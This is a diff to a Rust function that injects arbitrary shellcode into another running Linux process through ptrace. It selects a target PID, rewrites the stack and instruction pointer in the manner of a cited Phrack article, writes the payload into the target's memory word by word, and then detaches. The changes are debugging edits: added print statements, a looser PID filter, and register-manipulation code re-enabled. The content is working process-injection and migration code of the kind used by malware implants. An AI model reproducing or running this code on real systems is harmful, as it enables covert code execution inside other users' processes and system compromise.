@@ -16,6 +16,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
                                     .unwrap();
     word_size_in_bytes.pop();
     let word_size_in_bytes = word_size_in_bytes.parse::<usize>().unwrap() >> 3;
+    println!("WORD SIZE {}", word_size_in_bytes);
 
     // Mutate the shellcode to pad it with nops to a length divisible by WORD size
     let mut shellcode = shellcode.to_vec();
@@ -33,7 +34,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
                                                         .split('\n')
                                                         .flat_map(|s| s.parse().ok())
                                                         .collect();
-    pids.retain(|i| *i > 1000 && *i != process::id() as i32);
+    pids.retain(|i| *i > 100 && *i != process::id() as i32);
     for pid in pids.iter().rev() {
         if attach(Pid::from_raw(*pid)).is_ok() {
             target_pid = *pid;
@@ -44,7 +45,6 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
         panic!("Could not find a process whose memory can be manipulated");
     }
 
-
     let debug_command = Command::new("ps")
             .arg("-p")
             .arg(target_pid.to_string())
@@ -54,6 +54,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
             .unwrap();
     let command_output = String::from_utf8(debug_command.stdout)
                                             .unwrap();
+    let command_output = command_output.trim().to_string();
     println!("TARGET PID {}", target_pid);
     println!("TARGET {}", command_output);
 
@@ -68,21 +69,22 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     };
 
     // Modify registers similar to how http://phrack.org/issues/59/12.html did
-    //registers.rsp -= 4;
-    //if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
-    //    panic!("Unable to write RIP to RSP in target process: {}", error);
-    //}
-    //let mut point = registers.rsp - 1024;
-    //registers.rip = registers.rsp - 1022;
-    let mut point = registers.rip;
-    registers.rip += 2;
+    registers.rsp -= 4;
+    if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
+        panic!("Unable to write RIP to RSP in target process: {}", error);
+    }
+    let mut point = registers.rsp - 1024;
+    registers.rip = registers.rsp - 1022;
+    println!("POINT {:?} RIP {:?}", point as *mut c_void, registers.rip as *mut c_void);
     if let Err(error) = setregs(target_pid, registers) {
         panic!("Unable to reset target process registers: {}", error);
     }
+    println!("{:?}", registers);
 
     // Write shellcode to target process one WORD at a time
     let shellcode_chunks: Vec<&[u8]> = shellcode.chunks(word_size_in_bytes).collect();
     for chunk in shellcode_chunks {
+        println!("WRITING VALUE {:?} FROM {:p} TO {:?}", chunk, chunk, point as *mut c_void);
         if let Err(error) = unsafe { write(target_pid, point as *mut c_void, chunk.as_ptr() as *mut c_void) } {
             panic!("Unable to portion of shellcode at {:p} to target process: {}", chunk, error);
         }
@@ -93,5 +95,6 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     if let Err(error) = detach(target_pid, None) {
         panic!("Unable to detach from target process: {}", error);
     }
+    
     println!("DONE?");
 }
